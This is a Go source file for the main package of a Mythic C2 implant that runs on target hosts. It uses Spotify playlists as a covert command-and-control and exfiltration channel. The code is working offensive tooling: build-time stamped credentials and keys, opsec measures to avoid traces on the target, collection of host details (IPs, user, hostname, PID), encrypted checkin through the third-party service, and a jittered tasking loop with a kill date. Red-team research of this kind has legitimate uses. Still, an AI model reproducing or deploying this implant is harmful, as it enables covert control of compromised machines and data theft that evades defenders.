// Package main is the Mythic C2 agent (payload) for the "spotify" profile.
// It runs on target hosts and talks to Mythic through the server-side
// spotify profile container over the shared Spotify-playlist transport.
//
// Build (REQUIRED: -tags implantonly excludes the operator console /
// readline from internal/c2):
//
//	go build -tags implantonly \
//	  -ldflags "-s -w \
//	    -X main.PayloadUUID=<mythic payload uuid> \
//	    -X main.AESKeyB64=<base64 aes256_hmac key, empty=plaintext> \
//	    -X main.Passphrase=<spotexfil transport key> \
//	    -X main.SpotifyUsername=<user> \
//	    -X main.SpotifyClientID=<id> \
//	    -X main.SpotifyClientSecret=<secret> \
//	    -X main.SpotifyRedirectURI=<uri> \
//	    -X main.SpotifyTokenFile=<path to pre-staged token json> \
//	    -X main.Interval=30 -X main.Jitter=10 \
//	    -X main.KillDate=2027-01-01T00:00:00Z" \
//	  ./cmd/mythicagent
//
// Opsec: the agent never runs interactive OAuth (AllowOAuth=false) and
// never writes a token cache (PersistToken=false); a token must be
// pre-staged via SpotifyTokenFile or the SPOTIFY_TOKEN_JSON env var.
package main

import (
	"context"
	crand "crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/sourcefrenchy/spotexfil/pkg/mythicmap"
	"github.com/sourcefrenchy/spotexfil/pkg/spotify"
)

// Stamped at build time via -ldflags -X. This is EXACTLY the contract the
// Python builder stamps — do not rename.
var (
	PayloadUUID         string // Mythic payload UUID (36 chars)
	AESKeyB64           string // base64 AESPSK key; empty = plaintext mode
	Passphrase          string // spotexfil transport (playlist) encryption key
	SpotifyUsername     string
	SpotifyClientID     string
	SpotifyClientSecret string
	SpotifyRedirectURI  string
	SpotifyTokenFile    string // optional pre-staged spotipy-format token JSON
	Interval            string // seconds, string->int
	Jitter              string // seconds
	KillDate            string // RFC3339; empty = none
)

const (
	defaultIntervalSec = 30
	minIntervalSec     = 20
	defaultJitterSec   = 10
	maxBackoff         = 5 * time.Minute
	minSleep           = time.Second
)

// Polling knobs for reading the get_tasking/checkin reply off the cmd
// channel. Package vars so tests can shrink them.
var (
	taskPollAttempts = 10
	taskPollInterval = 3 * time.Second
	checkinPollTries = 5
	checkinPollWait  = 3 * time.Second
)

// agentConfig is the parsed, validated runtime configuration.
type agentConfig struct {
	uuid       string
	key        []byte // nil = plaintext mode
	passphrase string
	spotify    *spotify.Config
	tokenFile  string
	interval   time.Duration
	jitter     time.Duration
	killDate   time.Time // zero = none
}

// parseConfig validates the stamped build-time variables.
func parseConfig() (*agentConfig, error) {
	if len(PayloadUUID) != 36 {
		return nil, fmt.Errorf("PayloadUUID must be a 36-char UUID, got %d chars", len(PayloadUUID))
	}
	var key []byte
	if AESKeyB64 != "" {
		k, err := mythicmap.DecodeKey(AESKeyB64)
		if err != nil {
			return nil, fmt.Errorf("AESKeyB64: %w", err)
		}
		key = k
	}
	if Passphrase == "" {
		return nil, errors.New("Passphrase not stamped")
	}
	if SpotifyUsername == "" || SpotifyClientID == "" ||
		SpotifyClientSecret == "" || SpotifyRedirectURI == "" {
		return nil, errors.New("Spotify credentials incomplete (need Username, ClientID, ClientSecret, RedirectURI)")
	}

	interval := defaultIntervalSec
	if Interval != "" {
		n, err := strconv.Atoi(Interval)
		if err != nil {
			return nil, fmt.Errorf("Interval %q: %v", Interval, err)
		}
		interval = n
	}
	if interval < minIntervalSec {
		interval = minIntervalSec
	}

	jitter := defaultJitterSec
	if Jitter != "" {
		n, err := strconv.Atoi(Jitter)
		if err != nil {
			return nil, fmt.Errorf("Jitter %q: %v", Jitter, err)
		}
		jitter = n
	}
	if jitter < 0 {
		jitter = 0
	}
	if jitter > interval {
		jitter = interval
	}

	var kill time.Time
	if KillDate != "" {
		t, err := time.Parse(time.RFC3339, KillDate)
		if err != nil {
			return nil, fmt.Errorf("KillDate %q: %v", KillDate, err)
		}
		kill = t
	}

	return &agentConfig{
		uuid:       PayloadUUID,
		key:        key,
		passphrase: Passphrase,
		spotify: &spotify.Config{
			Username:     SpotifyUsername,
			ClientID:     SpotifyClientID,
			ClientSecret: SpotifyClientSecret,
			RedirectURI:  SpotifyRedirectURI,
		},
		tokenFile: SpotifyTokenFile,
		interval:  time.Duration(interval) * time.Second,
		jitter:    time.Duration(jitter) * time.Second,
		killDate:  kill,
	}, nil
}

// backoff doubles base per consecutive failure, capped at maxBackoff.
func backoff(base time.Duration, failures int) time.Duration {
	d := base
	for i := 0; i < failures; i++ {
		d *= 2
		if d >= maxBackoff {
			return maxBackoff
		}
	}
	if d < 0 { // overflow guard
		return maxBackoff
	}
	return d
}

// jittered returns base +/- uniform jitter in [-j, +j] (crypto/rand),
// floored at minSleep.
func jittered(base, j time.Duration) time.Duration {
	if j <= 0 {
		if base < minSleep {
			return minSleep
		}
		return base
	}
	n, err := crand.Int(crand.Reader, big.NewInt(int64(2*j)+1))
	if err != nil {
		return base
	}
	d := base - j + time.Duration(n.Int64())
	if d < minSleep {
		return minSleep
	}
	return d
}

// killDatePassed reports whether a (possibly zero) kill date is in the past.
func killDatePassed(kill time.Time) bool {
	return !kill.IsZero() && time.Now().After(kill)
}

// checkinMessage is the Mythic checkin inner JSON.
type checkinMessage struct {
	Action       string   `json:"action"`
	IP           string   `json:"ip"`
	IPs          []string `json:"ips"`
	OS           string   `json:"os"`
	Architecture string   `json:"architecture"`
	User         string   `json:"user"`
	Host         string   `json:"host"`
	Domain       string   `json:"domain"`
	PID          int      `json:"pid"`
	UUID         string   `json:"uuid"`
	ProcessName  string   `json:"process_name"`
}

// checkinResponse is Mythic's checkin acknowledgement; it may carry a new
// callback UUID the agent must adopt.
type checkinResponse struct {
	Action string `json:"action"`
	UUID   string `json:"uuid"`
	Status string `json:"status"`
}

// mythicArch maps GOARCH to Mythic architecture strings.
func mythicArch() string {
	switch runtime.GOARCH {
	case "amd64":
		return "x64"
	case "arm64":
		return "arm64"
	case "386":
		return "x86"
	default:
		return runtime.GOARCH
	}
}

// localIPs returns non-loopback IPv4 addresses, first usable first.
func localIPs() []string {
	var out []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if v4 := ip.To4(); v4 != nil {
				out = append(out, v4.String())
			}
		}
	}
	return out
}

// buildCheckin builds the checkin inner JSON for the given payload UUID.
func buildCheckin(uuid string) ([]byte, error) {
	ips := localIPs()
	first := ""
	if len(ips) > 0 {
		first = ips[0]
	}
	host, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}
	return json.Marshal(checkinMessage{
		Action:       "checkin",
		IP:           first,
		IPs:          ips,
		OS:           runtime.GOOS,
		Architecture: mythicArch(),
		User:         username,
		Host:         host,
		Domain:       "",
		PID:          os.Getpid(),
		UUID:         uuid,
		ProcessName:  filepath.Base(os.Args[0]),
	})
}

// doCheckin sends the checkin and waits briefly for Mythic's acknowledgement.
// If the reply carries a callback UUID, it is returned and must be adopted;
// otherwise the payload UUID is kept. A missing reply is not fatal.
func doCheckin(ctx context.Context, t transport, uuid string, key []byte, seqSource *atomic.Int64) (string, error) {
	body, err := buildCheckin(uuid)
	if err != nil {
		return uuid, fmt.Errorf("build checkin: %w", err)
	}
	env, err := mythicmap.Encrypt(uuid, key, body)
	if err != nil {
		return uuid, fmt.Errorf("encrypt checkin: %w", err)
	}
	if err := t.send(ctx, env, int(seqSource.Add(1))); err != nil {
		return uuid, fmt.Errorf("send checkin: %w", err)
	}

	for i := 0; i < checkinPollTries; i++ {
		_, pt, seqs, rerr := t.readForMe(ctx)
		if rerr == nil && pt != nil {
			_ = t.clean(ctx, seqs)
			var cr checkinResponse
			if json.Unmarshal(pt, &cr) == nil && len(cr.UUID) == 36 {
				return cr.UUID, nil
			}
			return uuid, nil
		}
		select {
		case <-ctx.Done():
			return uuid, ctx.Err()
		case <-time.After(checkinPollWait):
		}
	}
	return uuid, nil
}

func main() {
	cfg, err := parseConfig()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] config: %v\n", err)
		os.Exit(1)
	}
	if killDatePassed(cfg.killDate) {
		return
	}

	client, err := spotify.NewClientWithOptions(cfg.spotify, spotify.ClientOptions{
		UseCoverNames: true,
		AllowOAuth:    false, // opsec: no browser on target
		PersistToken:  false, // opsec: no token cache on disk
		TokenFile:     cfg.tokenFile,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] spotify auth: %v\n", err)
		os.Exit(1)
	}

	tr := newSpotifyTransport(client, cfg.passphrase, cfg.uuid, cfg.key)
	var seq atomic.Int64
	seq.Store(randomSeqStart())

	ctx := context.Background()
	callbackUUID, err := doCheckin(ctx, tr, cfg.uuid, cfg.key, &seq)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] checkin: %v (continuing with payload UUID)\n", err)
	}
	tr.setUUID(callbackUUID)

	failures := 0
	for {
		if killDatePassed(cfg.killDate) {
			return
		}
		if _, err := runOnce(ctx, tr, callbackUUID, cfg.key, &seq); err != nil {
			failures++
		} else {
			failures = 0
		}
		if exitRequested.Load() {
			return
		}
		time.Sleep(backoff(jittered(cfg.interval, cfg.jitter), failures))
	}
}

// randomSeqStart picks a random initial playlist sequence number so
// sequential runs of the agent don't collide on low seqs.
func randomSeqStart() int64 {
	n, err := crand.Int(crand.Reader, big.NewInt(90000))
	if err != nil {
		return 1000
	}
	return n.Int64() + 1000
}
